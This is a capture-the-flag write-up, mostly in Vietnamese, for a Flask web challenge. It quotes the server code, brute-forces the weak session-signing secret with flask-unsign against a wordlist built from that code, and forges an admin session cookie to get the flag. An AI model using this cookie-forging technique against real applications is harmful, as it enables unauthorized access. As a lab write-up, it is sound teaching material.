Most Cookies
===
**Category:** Web

**Author:** MADSTACKS
### Description
- Alright, enough of using my own encryption. Flask session cookies should be plenty secure!
- Source: `server.py`

### Overview
- Site ở challange này giống như challange `Cookies`.
- Kiểm tra cookie có name là `session` thì thấy một chuỗi khá giống jwt vì vậy mang chuỗi đó đi giải mã nó thì nhận được `very_auth` bằng `blank`
- Thay đổi value của `session` bằng bất kì giá trị nào thì chúng ta không nhận được bất kì gì mới hoặc lỗi nào nào.

### Solution
- Đọc code từ file `server.py` của author cung cấp.
```py
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
```
- Ở đoạn code có thể thấy được cookie_name là một mảng gồm nhiều giá trị khác nhau. Secret_key của jwt là được radom trong mảng đó.
- Đọc kĩ code thì ta thấy được một path là `/display` và là hàm flag() ở dưới đây
```py
@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp
```
- Phân tích đoạn code này thì chúng ta thấy nó lưu `session["very_auth"]` vô biến check và kiểm tra nó có phải là `admin` thì sẽ render ra file `flag.html`.
- Từ đoạn code trên ta suy ra cần thay đổi giá trị của `session["very_auth"]` thành admin thì chúng ta có flag. 
- Để làm điều đó thì chúng ta phải tìm ra secret của jwt ban đầu, mà secret của jwt ban đầu là random trong mảng `cookie_names` như chúng ta phân tích ở đầu.
- Vì vậy ở đây chúng ta chỉ cần lưu nhưng giá trị có trong mảng đó vào 1 file và brute secret có jwt ban đầu bằng tool `flask-unsign` theo wordlist chúng ta tạo thì có secret và sau đó thay đổi `very_auth` thành admin và encode lại và gửi lên.

##### Payload
- Mình lưu các giá trị vào file `word.txt`
```
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YF3FlA.6aduKYEKdWwTMuk0P_ziCREu5pQ" --wordlist=word.txt
```
- Ta nhận được key sau đó encode lại.
```
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'butter'
```
- Cuối cùng thay cookie bằng giá trị nhận được f5 lại và nhận flag :)
